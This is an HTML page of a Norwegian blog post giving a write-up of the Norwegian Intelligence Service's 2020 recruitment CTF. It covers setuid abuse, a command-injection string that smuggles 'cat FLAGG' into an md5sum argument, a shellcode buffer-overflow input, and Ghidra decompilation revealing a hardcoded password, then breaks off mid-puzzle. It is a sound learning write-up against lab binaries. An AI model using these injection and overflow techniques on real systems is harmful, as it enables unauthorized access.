<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v8.5.2 <https://hydejack.com/>
--><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><title>Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet | Fjanks security pages</title><meta name="generator" content="Jekyll v3.8.6" /><meta property="og:title" content="Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet" /><meta name="author" content="Fjank" /><meta property="og:locale" content="en" /><meta name="description" content="Etterretningstjenestens oppdrag er å avdekke hva eller hvem som truer Norge og Norges interesser, og på den måten bidra til vern av Norge. For å lykkes må vi blant annet skaffe oss tilgang til informasjon. Dette gjør vi ved bruk av ulike metoder og teknikker. En av metodene kaller vi offensive cyberoperasjoner. Etterretningstjenesten er den virksomheten i Norge som gjennomfører offensive cyberoperasjoner. Etterretningstjenesten trenger folk som har potensial til å bli de aller beste innenfor dette fagfeltet, og vi ønsker å tilby talenter en jobb hos oss. De som er kvalifisert vil få et heltidskurs i offensive cyberoperasjoner før de starter sin operative tjeneste." /><meta property="og:description" content="Etterretningstjenestens oppdrag er å avdekke hva eller hvem som truer Norge og Norges interesser, og på den måten bidra til vern av Norge. For å lykkes må vi blant annet skaffe oss tilgang til informasjon. Dette gjør vi ved bruk av ulike metoder og teknikker. En av metodene kaller vi offensive cyberoperasjoner. Etterretningstjenesten er den virksomheten i Norge som gjennomfører offensive cyberoperasjoner. Etterretningstjenesten trenger folk som har potensial til å bli de aller beste innenfor dette fagfeltet, og vi ønsker å tilby talenter en jobb hos oss. De som er kvalifisert vil få et heltidskurs i offensive cyberoperasjoner før de starter sin operative tjeneste." /><link rel="canonical" href="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" /><meta property="og:url" content="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" /><meta property="og:site_name" content="Fjanks security pages" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-06T00:00:00+01:00" /> <script type="application/ld+json"> {"headline":"Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet","dateModified":"2020-03-06T00:00:00+01:00","datePublished":"2020-03-06T00:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://fjank.no/blog/2020-03-06-etjenesten-ctf/"},"url":"https://fjank.no/blog/2020-03-06-etjenesten-ctf/","author":{"@type":"Person","name":"Fjank"},"description":"Etterretningstjenestens oppdrag er å avdekke hva eller hvem som truer Norge og Norges interesser, og på den måten bidra til vern av Norge. For å lykkes må vi blant annet skaffe oss tilgang til informasjon. Dette gjør vi ved bruk av ulike metoder og teknikker. En av metodene kaller vi offensive cyberoperasjoner. Etterretningstjenesten er den virksomheten i Norge som gjennomfører offensive cyberoperasjoner. Etterretningstjenesten trenger folk som har potensial til å bli de aller beste innenfor dette fagfeltet, og vi ønsker å tilby talenter en jobb hos oss. De som er kvalifisert vil få et heltidskurs i offensive cyberoperasjoner før de starter sin operative tjeneste.","@context":"https://schema.org"}</script><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Fjanks security pages"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="application-name" content="Fjanks security pages"><meta name="msapplication-config" content="/assets/ieconfig.xml"><meta name="theme-color" content="rgb(25,55,71)"><meta name="generator" content="Hydejack v8.5.2" /><link type="application/atom+xml" rel="alternate" href="https://fjank.no/feed.xml" title="Fjanks security pages" /><link rel="alternate" href="https://fjank.no/blog/2020-03-06-etjenesten-ctf/" hreflang="en"><link rel="shortcut icon" href="/assets/icons/favicon.ico"><link rel="apple-touch-icon" href="/assets/icons/icon.png"><link rel="manifest" href="/assets/manifest.json"><link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="dns-prefetch" href="/" id="_baseURL"><link rel="dns-prefetch" href="/sw.js" id="_hrefSW"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js" id="_hrefKatexJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css" id="_hrefKatexCSS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/contrib/copy-tex.min.js" id="_hrefKatexCopyJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/contrib/copy-tex.min.css" id="_hrefKatexCopyCSS"><link rel="dns-prefetch" href="/assets/img/swipe.svg" id="_hrefSwipeSVG"><link rel="dns-prefetch" href="https://fjank-no.disqus.com" id="_hrefDisqus"> <script> !function(e,t){"use strict";function n(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,o){var r=t.createElement("script");r.src=e,o&&n(r,"load",o,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(r,a),r},e._loaded=!1,e.loadJSDeferred=function(o,r){function a(){e._loaded=!0,r&&n(c,"load",r,{once:!0});var o=t.scripts[0];o.parentNode.insertBefore(c,o)}var c=t.createElement("script");return c.src=o,e._loaded?a():n(e,"load",a,{once:!0}),c},e.setRel=e.setRelStylesheet=function(e){function o(){this.rel="stylesheet"}n(t.getElementById(e),"load",o,{once:!0})}}(window,document); ; !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); ; !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); ; !function(w, d) { w._noPushState = false; w._noDrawer = false; }(window, document); </script> <!--[if gt IE 8]><!----><style> body{--code-font-family: Menlo,Monaco,Consolas,monospace;--font-weight: 400;--font-weight-bold: 700;--font-weight-heading: 400;--text-muted: #888;--gray-bg: rgba(0,0,0,0.025);--gray-text: #666;--menu-text: #bbb;--body-color: #333;--body-bg: #fff;--border-color: #ebebeb}.clearfix,.sidebar-social::after{content:"";display:table;clear:both}.color-transition,body,p,hr,.hr,table:not(.highlight) td,table:not(.highlight) th,.message{transition:background-color 1s ease, border-color 1s ease}.no-color-transition{transition:none !important}*{box-sizing:border-box}html,body{margin:0;padding:0}html{font-size:16px;line-height:1.75}body{color:var(--body-color);background-color:var(--body-bg);font-weight:var(--font-weight);overflow-y:scroll}a{text-decoration:none}.lead{margin-left:-1rem;margin-right:-1rem}.content img,.img,.content video,.video{max-width:100%}.content img.lead,.img.lead,.content video.lead,.video.lead{max-width:calc(100% + 2rem);width:calc(100% + 2rem)}h1,h2,h3,h4,h5,h6,.h1,.h2,.h3,.h4,.h5,.h6{font-weight:var(--font-weight-heading);margin:5rem 0 1rem}h1,.h1{font-size:2rem;line-height:1.3}h2,.h2{font-size:1.5rem;line-height:1.4}h3,.h3{font-size:1.17em;line-height:1.5}h4,h5,h6,.h4,.h5,.h6{font-size:1rem;margin-bottom:0.5rem}p{margin-top:0;margin-bottom:1rem}p.lead{font-size:1.2em;margin-top:1.5rem;margin-bottom:1.5rem;padding:0 1rem}ul,ol,dl{margin-top:0;margin-bottom:1rem}ul,ol{padding-left:1.25rem}hr{position:relative;margin:3rem 0;border:0;border-top:1px solid var(--border-color)}.hr{border-bottom:1px solid var(--border-color);padding-bottom:1rem;margin-bottom:2rem}table:not(.highlight){border-collapse:collapse;margin-bottom:2rem;margin-left:-1rem}table:not(.highlight) td,table:not(.highlight) th{padding:.25rem .5rem;border:1px solid var(--border-color)}table:not(.highlight) td:first-child,table:not(.highlight) th:first-child{padding-left:1rem}table:not(.highlight) td:last-child,table:not(.highlight) th:last-child{padding-right:1rem}.page{margin-bottom:3em}.page li+li{margin-top:.25rem}.page>header{margin-bottom:2rem}.page-title,.post-title{margin-top:0}.post-date{display:block;margin-top:-0.5rem;margin-bottom:1rem;color:var(--text-muted)}.related-posts{padding-left:0;list-style:none;margin-bottom:2rem}.related-posts>li,.related-posts>li+li{margin-top:1rem}.message{margin-bottom:1rem;padding:1rem;color:var(--gray-text);background-color:var(--gray-bg);margin-left:-1rem;margin-right:-1rem}@media screen{body::before{content:'';width:.5rem;background:var(--border-color);position:fixed;left:0;top:0;bottom:0}}@media screen and (min-width: 64em){body::before{width:21rem}}@media screen and (min-width: 1666px){body::before{width:calc(50% - 28rem)}}@media screen and (min-width: 42em){html{font-size:17px}}@media screen and (min-width: 124em){html{font-size:18px}}.fade-in{animation-duration:500ms;animation-timing-function:ease;animation-name:fade-in;animation-fill-mode:forwards}@keyframes fade-in{from{transform:translateY(-3rem);opacity:0}50%{transform:translateY(-3rem);opacity:0}to{transform:translateY(0);opacity:1}}.fl{float:left}.fr{float:right}.mb4{margin-bottom:4rem}.mb6{margin-bottom:6rem}.mt0{margin-top:0}.mt2{margin-top:2rem}.mt3{margin-top:3rem}.mt4{margin-top:4rem}.pb0{padding-bottom:0}.sixteen-nine{position:relative}.sixteen-nine::before{display:block;content:"";width:100%;padding-top:56.25%}.sixteen-nine>*{position:absolute;top:0;left:0;right:0;bottom:0}.sr-only{display:none}.border{border:1px solid var(--border-color)}hy-push-state a,.a{position:relative;padding-bottom:.15rem;border-bottom:1px solid}hy-push-state a.no-hover,.a.no-hover{border-bottom:none;padding-bottom:0}.content .img{overflow:hidden}.content .img img{margin:0;width:100%;height:100%;background-color:var(--gray-bg)}hy-drawer{width:100%;position:relative;overflow:hidden}@media screen and (min-width: 64em){hy-drawer{position:fixed;width:21rem;top:0;left:0;bottom:0;margin-left:0}hy-drawer.cover{position:relative;width:100%}}@media screen and (min-width: 1666px){hy-drawer{width:calc(50% - 28rem)}}.sidebar{position:relative;display:flex;justify-content:center;align-items:center;color:rgba(255,255,255,0.75);text-align:center;z-index:2;min-height:100vh}.sidebar a{color:#fff;border-bottom-color:rgba(255,255,255,0.2)}.sidebar-bg{position:absolute;top:0;left:calc(50% - 50vw);width:100vw;height:100%;background:#202020 center / cover}.sidebar-bg::after{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:rgba(0,0,0,0.05)}.sidebar-bg.sidebar-overlay::after{background:linear-gradient(to bottom, rgba(32,32,32,0) 0%, rgba(32,32,32,0.5) 50%, rgba(32,32,32,0) 100%)}.sidebar-sticky{position:relative;z-index:3;max-width:21rem;padding:1.5rem;contain:content}.sidebar-about .avatar{margin-bottom:1.5rem}.sidebar-about>h2{margin-top:0}.sidebar-nav>ul{list-style:none;padding-left:0}a.sidebar-nav-item{display:inline-block;font-weight:var(--font-weight-heading);line-height:1.75;padding:.25rem;border-bottom:1px solid rgba(255,255,255,0.2)}.sidebar-social>ul{display:inline-block;list-style:none;padding-left:0;margin-bottom:0}.sidebar-social>ul>li{float:left}.sidebar-social>ul>li>a{display:inline-block;text-align:center;font-size:1.4rem;width:3rem;height:4rem;padding:.5rem 0;line-height:3rem}.sidebar-social>ul li+li{margin-top:0}.fixed-common,.fixed-top,.fixed-bottom{position:fixed;left:0;width:100%;z-index:2}.fixed-top{top:0}.fixed-bottom{bottom:0}.navbar>.content{padding-top:0;padding-bottom:0;min-height:0;color:var(--menu-text)}.nav-btn-bar{margin:0 -1rem 0 -.875rem}.nav-btn{background:none;border:none;padding:1.75rem .875rem;color:var(--menu-text) !important;cursor:pointer}.animation-main{opacity:0;pointer-events:none}.content{position:relative;margin-left:auto;margin-right:auto;padding:6rem 1rem 12rem}@media screen{.content{padding-left:1.5rem;max-width:38rem;min-height:100vh}}@media screen and (min-width: 54em){.content{max-width:42rem}}@media screen and (min-width: 64em){.content{padding-left:1rem;margin-left:24rem;margin-right:3rem}}@media screen and (min-width: 88em){.content{margin-left:25rem;margin-right:4rem;max-width:48rem}}@media screen and (min-width: 1666px){.content{margin:auto}}.avatar{width:6.5rem;height:6.5rem;border-radius:100%;overflow:hidden}@media screen and (min-width: 88em){.avatar{width:7rem;height:7rem}}.content .avatar{float:right;margin-left:.5rem}html{font-family:Noto Sans,Helvetica,Arial,sans-serif}h1,h2,h3,h4,h5,h6,.h1,.h2,.h3,.h4,.h5,.h6,.heading{font-family:Roboto Slab,Helvetica,Arial,sans-serif}.content a:not(.btn){color:#4fb1ba;border-color:rgba(79,177,186,0.2)}.content a:not(.btn):hover{border-color:#4fb1ba}:focus{outline-color:#4fb1ba !important}.btn-primary{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:focus,.btn-primary.focus,.form-control:focus,.form-control.focus{box-shadow:0 0 0 3px rgba(79,177,186,0.5)}.btn-primary:hover,.btn-primary.hover{color:#fff;background-color:#409ba3;border-color:#409ba3}.btn-primary:disabled,.btn-primary.disabled{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:active,.btn-primary.active{color:#fff;background-color:#409ba3;border-color:#409ba3}::selection{color:#fff;background:#4fb1ba}::-moz-selection{color:#fff;background:#4fb1ba}</style><link rel="preload" as="style" href="/assets/css/hydejack-8.5.2.css" id="_stylePreload"><link rel="preload" as="style" href="/assets/icomoon/style.css" id="_iconsPreload"><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i&display=swap" id="_fontsPreload"> <script>setRel('_stylePreload');setRel('_iconsPreload');/**/setRel('_fontsPreload');/**/</script> <noscript><link rel="stylesheet" href="/assets/css/hydejack-8.5.2.css"><link rel="stylesheet" href="/assets/icomoon/style.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i&display=swap"> </noscript> <!--<![endif]--><body class="no-color-transition"><div id="_navbar" class="navbar fixed-top"><div class="content"><div class="nav-btn-bar"> <span class="sr-only">Jump to:</span> <a id="_menu" class="nav-btn no-hover fl" href="#_navigation"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a></div></div></div><hr class="sr-only" hidden /> <hy-push-state replace-ids="_main" link-selector="a[href]:not([href*='/assets/']):not(.external):not(.no-push-state)" duration="250" script-selector="script:not([type^='math/tex'])" prefetch ><main id="_main" class="content fade-in layout-post" role="main" data-color="rgb(79,177,186)" data-theme-color="rgb(25,55,71)" data-image="/assets/img/sidebar-bg.jpg" data-overlay ><article id="post-blog-etjenesten-ctf" class="page post mb6 h-entry" role="article"><header><h1 class="post-title p-name"> Etjenesten CTF: Vi søker deg som vil bidra i cyberoperasjoner mot trusler i utlandet</h1><p class="post-date heading"> <time class="dt-published" datetime="2020-03-06T00:00:00+01:00">06 Mar 2020</time> in <a href="/blog/" class="flip-title">Blog</a><p class="message" > Etterretningstjenestens oppdrag er å avdekke hva eller hvem som truer Norge og Norges interesser, og på den måten bidra til vern av Norge. For å lykkes må vi blant annet skaffe oss tilgang til informasjon. Dette gjør vi ved bruk av ulike metoder og teknikker. En av metodene kaller vi offensive cyberoperasjoner. Etterretningstjenesten er den virksomheten i Norge som gjennomfører offensive cyberoperasjoner. Etterretningstjenesten trenger folk som har potensial til å bli de aller beste innenfor dette fagfeltet, og vi ønsker å tilby talenter en jobb hos oss. De som er kvalifisert vil få et heltidskurs i offensive cyberoperasjoner før de starter sin operative tjeneste.</header><div class="e-content"><ul id="markdown-toc"><li><a href="#introduksjon" id="markdown-toc-introduksjon">Introduksjon</a><li><a href="#grunnleggende" id="markdown-toc-grunnleggende">Grunnleggende</a><ul><li><a href="#1-hvordan-virker-det" id="markdown-toc-1-hvordan-virker-det">1. Hvordan virker det.</a><li><a href="#2-setuid-basic" id="markdown-toc-2-setuid-basic">2. Setuid basic</a><li><a href="#3-basic-injection" id="markdown-toc-3-basic-injection">3. Basic injection</a><li><a href="#4-basic-buffer-overflow" id="markdown-toc-4-basic-buffer-overflow">4. Basic buffer overflow</a><li><a href="#5-basic-reverse-engineering" id="markdown-toc-5-basic-reverse-engineering">5. Basic reverse engineering</a></ul><li><a href="#hjernetrim" id="markdown-toc-hjernetrim">Hjernetrim</a><ul><li><a href="#lett---clmystery" id="markdown-toc-lett---clmystery">Lett - clmystery</a><li><a href="#knock-knock" id="markdown-toc-knock-knock">Knock knock</a><li><a href="#lett---runer" id="markdown-toc-lett---runer">Lett - runer</a><li><a href="#lett---sharing-secrets" id="markdown-toc-lett---sharing-secrets">Lett - Sharing secrets</a><li><a href="#middels---artwork" id="markdown-toc-middels---artwork">Middels - Artwork</a><li><a href="#middels---explosion" id="markdown-toc-middels---explosion">Middels - Explosion</a></ul><li><a href="#selve-oppdraget" id="markdown-toc-selve-oppdraget">Selve Oppdraget</a><li><a href="#situasjon" id="markdown-toc-situasjon">Situasjon</a><li><a href="#oppdrag" id="markdown-toc-oppdrag">Oppdrag</a><li><a href="#sql-injection" id="markdown-toc-sql-injection">SQL injection</a><li><a href="#whats-next" id="markdown-toc-whats-next">Whats next?</a><li><a href="#til-slutt" id="markdown-toc-til-slutt">Til slutt</a></ul><h2 id="introduksjon">Introduksjon</h2><p><hy-img root-margin="512px" src="/assets/img/blog/2020-etjenesten/E-Cyberops-Landingsside-banner.jpg" alt="Banner for cybertalent CTF">  <noscript><img data-ignore src="/assets/img/blog/2020-etjenesten/E-Cyberops-Landingsside-banner.jpg" alt="Banner for cybertalent CTF"/></noscript>  <span slot="loading" class="loading"><span class="icon-cog"></span></span></hy-img> Etteretningstjenesten har en åpen vurdering av aktuelle sikkerhetsutfordringer for Norge, som ble publisert i Fokus 2020. <a href="https://forsvaret.no/fokus">Fokus er Etterretningstjenestens åpne vurdering av aktuelle sikkerhetsutfordringer for Norge</a> På side 78 av denne var det et hint til en CTF konkurranse, og denne ble også reklamert for. Ved å gå til <a href="https://ctf.cybertalent.no/">https://ctf.cybertalent.no/</a> så kunne man registrere seg og etterhvert delta på konkurransen. Jeg endte opp på en finfin 21. plass til slutt og lærte mye på veien. Konkurransen forgikk ved å bruke SSH for å komme seg inn på konkurranseserveren, hvor man kunne finne noen dokumenter, litt historie, og de faktiske oppgavene. Oppgavene var delt opp i Grunnleggende, Hjernetrim og Oppdrag. La oss hoppe i det!<h2 id="grunnleggende">Grunnleggende</h2><h3 id="1-hvordan-virker-det">1. Hvordan virker det.</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>En kort forkaring over hvordan systemet virker og hvordan man kan registrere flagg man finner.
</code></pre></div></div><p>Her er det veldig grunnleggende, oppsett av scoreboard og hvordan registrere flagg.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scoreboard <span class="nt">--set-name</span> fjank
<span class="nb">cat </span>FLAGG
scoreboard FLAGG
</code></pre></div></div><h3 id="2-setuid-basic">2. Setuid basic</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>En forklaring av hvordan setuid fungerer
</code></pre></div></div><p>Interessant, å bli introdusert for <a href="https://en.wikipedia.org/wiki/Setuid">setuid programmer</a> som grunnleggende. Dette kan bli interessant. Setuid programmet ligger i samme katalog som vi står i, så det er bare å referere til current katalog for å kjøre korrekt program.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./cat FLAGG
</code></pre></div></div><h3 id="3-basic-injection">3. Basic injection</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>En forklaring av hvordan command injection fungerer.
</code></pre></div></div><p>Basic <a href="https://owasp.org/www-community/attacks/Command_Injection">command injection</a> løser denne enkelt.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./md5sum <span class="s2">"FLAGG;cat FLAGG"</span>
</code></pre></div></div><h3 id="4-basic-buffer-overflow">4. Basic buffer overflow</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>En forklaring av hvordan en basic buffer overflow fungerer.
</code></pre></div></div><p>En svært enkelt buffer overflow med masse hjelp, man blir holdt i hånden hele veien.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>overflow.c
<span class="nb">export </span><span class="nv">SHC</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>sample_shellcode<span class="si">)</span>
/overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHabcdefghabcdefghabcdefgh000000
<span class="nb">cat </span>FLAGG
</code></pre></div></div><h3 id="5-basic-reverse-engineering">5. Basic reverse engineering</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>En grunnleggende introduksjon til reverse engineering.
</code></pre></div></div><p>Denne er også veldig basic, vi får et program og skal finne et passord. <a href="https://ghidra-sre.org/">Ghidra</a> hjelper oss til å finne metoden check_password, som med litt statisk analyse lett gir oss passordet “Reverse_engineering_er_morsomt__”.<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">check_password</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar3</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">local_16</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_15</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_14</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_13</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_12</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_11</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_10</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_f</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_e</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_d</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
  
  <span class="n">sVar2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">sVar2</span> <span class="o">==</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="s">"Reverse_engineering"</span><span class="p">,</span><span class="n">param_1</span><span class="p">,</span><span class="mh">0x13</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">param_1</span><span class="p">[</span><span class="mh">0x13</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'_'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">local_c</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mh">0x13</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">local_c</span> <span class="o">==</span> <span class="mh">0x5f72655f</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">local_16</span> <span class="o">=</span> <span class="sc">'m'</span><span class="p">;</span>
          <span class="n">local_15</span> <span class="o">=</span> <span class="mh">0x6f</span><span class="p">;</span>
          <span class="n">local_14</span> <span class="o">=</span> <span class="mh">0x72</span><span class="p">;</span>
          <span class="n">local_13</span> <span class="o">=</span> <span class="mh">0x73</span><span class="p">;</span>
          <span class="n">local_12</span> <span class="o">=</span> <span class="mh">0x6f</span><span class="p">;</span>
          <span class="n">local_11</span> <span class="o">=</span> <span class="mh">0x6d</span><span class="p">;</span>
          <span class="n">local_10</span> <span class="o">=</span> <span class="mh">0x74</span><span class="p">;</span>
          <span class="n">local_f</span> <span class="o">=</span> <span class="mh">0x5f</span><span class="p">;</span>
          <span class="n">local_e</span> <span class="o">=</span> <span class="mh">0x5f</span><span class="p">;</span>
          <span class="n">local_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_16</span><span class="p">,</span><span class="n">param_1</span> <span class="o">+</span> <span class="mh">0x17</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">uVar3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">uVar3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div><h2 id="hjernetrim">Hjernetrim</h2><h3 id="lett---clmystery">Lett - clmystery</h3><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Her er det litt kjøreregler, man må finne en mistenkt, aller helst kun ved hjelp av command line.
</code></pre></div></div><p>Jo flinkere man er til kommandolinje, jo lettere blir denne. Vi begynner med å finne alle CLUE i crimescene.<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>CLUE crimescene
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CLUE: Footage from an ATM security camera is blurry but shows that the perpetrator is a tall male, at least 6'.
CLUE: Found a wallet believed to belong to the killer: no ID, just loose change, and membership cards for AAA, Delta SkyMiles, the local library, and the Museum of Bash History. The cards are totally untraceable and have no name, for some reason.
CLUE: Questioned the barista at the local coffee shop. He said a woman left right before they heard the shots. The name on her latte was Annabel, she had blond spiky hair and a New Zealand accent.
</code></pre></div></div><p>La oss sjekke det siste hintet:<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep </span>Annabel people
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Annabel Sun     F       26      Hart Place, line 40
Annabel Church  F       38      Buckingham Place, line 179
</code></pre></div></div><p>La oss sjekke Annabel Sun først<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'39,41p'</span> streets/Hart_Place
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEE INTERVIEW #47246024
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>interviews/interview-47246024
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ms. Sun has brown hair and is not from New Zealand.  Not the witness from the cafe.
</code></pre></div></div><p>Nuvel, da får vi se på Annabel Church da<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'178,180p'</span> streets/Buckingham_Place
</code></pre></div></div><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SEE INTERVIEW #699607
</code></pre></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>interviews/interview-699607
